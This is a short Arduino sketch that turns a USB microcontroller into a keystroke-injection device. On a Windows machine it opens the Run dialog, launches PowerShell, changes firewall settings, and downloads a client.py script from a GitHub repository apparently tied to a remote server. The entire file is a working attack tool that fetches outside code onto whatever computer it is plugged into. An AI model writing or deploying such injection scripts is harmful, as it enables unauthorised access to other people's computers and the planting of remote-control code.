#include <Keyboard.h>
void setup() 
{
    Keyboard.begin();
    delay(5000);
    Keyboard.press(KEY_LEFT_GUI);//win 
    delay(500); 
    Keyboard.press('r');//r
    delay(500); 
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    Keyboard.println("POWERSHELL -NOP");
    delay(1000);
    Keyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"); 
    delay(1500);  
    Keyboard.println("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");  

    Keyboard.println("Invoke-RestMethod -Uri https://github.com/orimeged/arduino_server/blob/client/client.py -OutFile ./client.py");
  Keyboard.end();
}
void loop()
{
}
